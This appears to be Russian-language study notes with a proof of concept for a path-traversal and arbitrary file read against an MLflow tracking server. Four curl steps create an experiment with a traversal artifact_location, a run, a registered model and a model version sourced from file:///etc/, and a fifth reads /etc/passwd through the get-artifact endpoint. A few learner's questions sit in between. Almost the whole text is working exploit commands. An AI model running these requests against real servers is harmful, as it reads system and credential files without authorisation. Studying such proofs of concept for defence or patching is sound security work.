### 1. Создай experiment

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc", "artifact_location": "http:///?/../../../../../../../../../../../../../../etc/"}' \
    "$MLFLOW_URI/ajax-api/2.0/mlflow/experiments/create"
```

- experiment —
- _что делает очень много двоеточий?_
- _что такое etc?_

### 2. Создай run в experiment

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"experiment_id": "{{EXPERIMENT_ID}}"}' \
    "$MLFLOW_URI/api/2.0/mlflow/runs/create"
```

### 3. Создай registered model

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc"}' \
    "$MLFLOW_URI/ajax-api/2.0/mlflow/registered-models/create"
```

### 4. Привяжи registered model к run

```bash
curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "poc", "run_id": "{{RUN_ID}}", "source": "file:///etc/"}' \
    "$MLFLOW_URI/ajax-api/2.0/mlflow/model-versions/create"
```

### ???

### 5. PROFIT. Прочитай /etc/passwd

```bash
curl "$MLFLOW_URI/model-versions/get-artifact?path=passwd&name=poc&version=1"
```
